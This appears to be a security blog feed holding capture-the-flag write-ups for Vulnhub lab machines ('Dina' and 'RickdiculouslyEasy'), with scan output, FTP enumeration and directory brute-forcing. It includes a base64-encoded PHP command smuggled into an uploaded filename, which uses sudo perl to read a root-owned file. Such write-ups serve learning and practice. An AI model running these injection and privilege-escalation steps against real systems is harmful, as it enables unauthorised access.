&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Uploaded file: Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on this host:
    env_reset,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User www-data may run the following commands on this host:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmm, we can run &lt;strong&gt;perl&lt;/strong&gt; commands with root permissions. Let’s try to use it and read the contents of the flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudo perl-e 'exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat /root/flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)'&quot;&lt;/span&gt; | base64
&lt;span class=&quot;nv&quot;&gt;c3VkbyBwZXJsLWUgJ2V4ZWMoImNhdCAvcm9vdC9mbGFnLnR4dCIpJwo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now it’s time to upload it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;base64_decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'c3VkbyBwZXJsIC1lICdleGVjKCJjYXQgL3Jvb3QvZmxhZy50eHQiKScK'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; dia&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;.php
Uploaded file: ________                                                _________
&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_______&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------___&lt;/span&gt;       ___         ____----------/_________/
    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;______&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\\\&lt;/span&gt;   //_ _ &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;    //////-------/________/
        &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_____&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; ~|~ &lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;//------/________/
            &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;____&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt; //----/_____/
                 &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;-&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;/____/
                       &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/  &lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;_/
                          |  -&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  -  &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;


root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....


CONGO.........
FLAG : 22d06624cd604a0626eb5a2992a6f2e6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Our goal was to get the flag, so the job is done here, but reverse shell would be very easy to implement from this step.&lt;/p&gt;
</description>
        <pubDate>Sat, 18 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-dina/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-dina/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Rickdiculously Easy 1</title>
        <description>&lt;p&gt;With some time between lectures, I decided to try out some new machines from Vulnhub - in particular the one called &lt;strong&gt;RickdiculouslyEasy&lt;/strong&gt; as it seems to be really fun.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This is a fedora server vm, created with virtualbox.

It is a very simple Rick and Morty themed boot to root.

There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.

It's designed to be a beginner ctf, if you're new to pen testing, check it out!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/luke,562/&quot;&gt;&lt;b&gt;Luke&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://download.vulnhub.com/rickdiculouslyeasy/RickdiculouslyEasy.zip&quot;&gt;&lt;b&gt;RickdiculouslyEasy&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;write-up&quot;&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: Kali Linux &lt;strong&gt;10.0.2.4&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Victim: RickdiculouslyEasy &lt;strong&gt;10.0.2.15&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As always let’s start by scanning the machine using &lt;strong&gt;nmap&lt;/strong&gt;. This time I’m going to let it run a little longer, as I know that there are often hidden ports outside the default port range of nmap.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.15

Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-11-01 05:24 EDT
NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:24
Completed NSE at 05:24, 0.00s elapsed
Initiating NSE at 05:24
Completed NSE at 05:24, 0.00s elapsed
Initiating ARP Ping Scan at 05:24
Scanning 10.0.2.15 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 05:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 05:24
Completed Parallel DNS resolution of 1 host. at 05:24, 0.01s elapsed
Initiating SYN Stealth Scan at 05:24
Scanning 10.0.2.15 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 22/tcp on 10.0.2.15
Discovered open port 21/tcp on 10.0.2.15
Discovered open port 80/tcp on 10.0.2.15
Discovered open port 60000/tcp on 10.0.2.15
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15 from 5 to 10 due to 23 out of 57 dropped probes since last increase.
SYN Stealth Scan Timing: About 11.24% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:05 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 9090/tcp on 10.0.2.15
SYN Stealth Scan Timing: About 13.29% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:38 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 15.35% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:22 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 17.42% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:34 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Warning: 10.0.2.15 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
SYN Stealth Scan Timing: About 19.23% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:34 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 20.90% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:25 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 25.49% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:12:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 41.68% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:21 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 13337/tcp on 10.0.2.15
SYN Stealth Scan Timing: About 49.01% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:22 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 55.69% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:19 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 61.36% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:16 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 66.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 72.09% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:05 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 77.51% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:57 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 82.81% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:49 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 88.12% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 93.19% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:32 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 22222/tcp on 10.0.2.15
Completed SYN Stealth Scan at 05:50, 1569.31s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 05:50
Scanning 7 services on 10.0.2.15
Completed Service scan at 05:50, 11.01s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.15&lt;/span&gt;
NSE: Script scanning 10.0.2.15.
Initiating NSE at 05:50
NSE: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 05:51, 30.28s elapsed
Initiating NSE at 05:51
Completed NSE at 05:51, 1.02s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00081s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| &lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0              42 Aug 22 05:10 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?
| fingerprint-strings:
|   NULL:
|_    Welcome to Ubuntu 14.04.5 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.4.0-31-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.27 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Fedora&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Fedora&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Morty&lt;span class=&quot;s1&quot;&gt;'s Website
9090/tcp  open  http    Cockpit web service
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://10.0.2.15:9090/
13337/tcp open  unknown
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (EdDSA)
60000/tcp open  unknown
|_drda-info: ERROR
| fingerprint-strings:
|   NULL, ibm-db2:
|_    Welcome to Ricks half baked reverse shell...
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(NULL
SF:,42,&quot;Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.4
SF:\.0-31-generic\x20x86_64\)\n&quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.60%I=7%D=11/1%Time=59F998F5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,29,&quot;FLAG:{TheyFoundMyBackDoorMorty}-10Points\n&quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port60000-TCP:V=7.60%I=7%D=11/1%Time=59F998FB%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2F,&quot;Welcome\x20to\x20Ricks\x20half\x20baked\x20reverse\x20shell\.\.
SF:\.\n#\x20&quot;)%r(ibm-db2,2F,&quot;Welcome\x20to\x20Ricks\x20half\x20baked\x20re
SF:verse\x20shell\.\.\.\n#\x20&quot;);
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Uptime guess: 35.438 days (since Tue Sep 26 19:20:25 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 10.0.2.15

NSE: Script Post-scanning.
Initiating NSE at 05:51
Completed NSE at 05:51, 0.00s elapsed
Initiating NSE at 05:51
Completed NSE at 05:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1615.79 seconds
           Raw packets sent: 128763 (5.668MB) | Rcvd: 128754 (5.153MB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And together with the results of this comprehensive scan, we get the first flag!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG:{TheyFoundMyBackDoorMorty}-10Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let’s take a look at all the services more closely. Firstly, we can check &lt;strong&gt;ftp&lt;/strong&gt; using anonymous login.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ftp 10.0.2.15
Connected to 10.0.2.15.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.15:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              33 Aug 22 05:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0              42 Aug 22 05:10 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp&amp;gt; get FLAG.txt
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: FLAG.txt remote: FLAG.txt
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;FLAG.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
42 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;21.4967 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;pub
250 Directory successfully changed.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Feb 12  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        0              33 Aug 22 05:10 ..
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;221 Goodbye.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That was easy, another flag is in our hands.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG{Whoa this is unexpected} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Next part would be &lt;strong&gt;ssh&lt;/strong&gt; service running on port &lt;strong&gt;21&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh 10.0.2.15
ssh_exchange_identification: Connection closed by remote host&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But unfortunately it’s not working so we can move to another port. Before scanning the website I decided to look at port &lt;strong&gt;9090&lt;/strong&gt; which is &lt;strong&gt;cockpit web service&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;https://10.0.2.15:9090/
FLAG {There is no Zeus, in your face!} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Third flag! That’s 30 points already gathered. Now we can move on to the website scanning.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/rickdiculouslyeasy/main_web.png&quot; alt=&quot;Main Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, as usuall, let’s brute force this website using &lt;strong&gt;dirbuster&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# dirb http://10.0.2.15/

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Wed Nov  1 04:49:28 2017
URL_BASE: http://10.0.2.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 4612                                                          

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.0.2.15/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://10.0.2.15/cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:217&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                
+ http://10.0.2.15/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:326&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                              
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.15/passwords/                                     
+ http://10.0.2.15/robots.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:126&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                              

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Entering directory: http://10.0.2.15/passwords/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(!)&lt;/span&gt; WARNING: Directory IS LISTABLE. No need to scan it.                        
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Use mode &lt;span class=&quot;s1&quot;&gt;'-w'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you want to scan it anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Wed Nov  1 04:49:31 2017
DOWNLOADED: 4612 - FOUND: 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A few good hits, both looking very promising. I wonder what’s hidden inside &lt;strong&gt;passwords&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/rickdiculouslyeasy/passwords.png&quot; alt=&quot;Passwords&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another flag!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FLAG{Yeah d- just don't do it.} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And what is much better, we have a password hidden in the comment of &lt;strong&gt;passwords.html&lt;/strong&gt; file. Let’s keep it in mind.&lt;/p&gt;

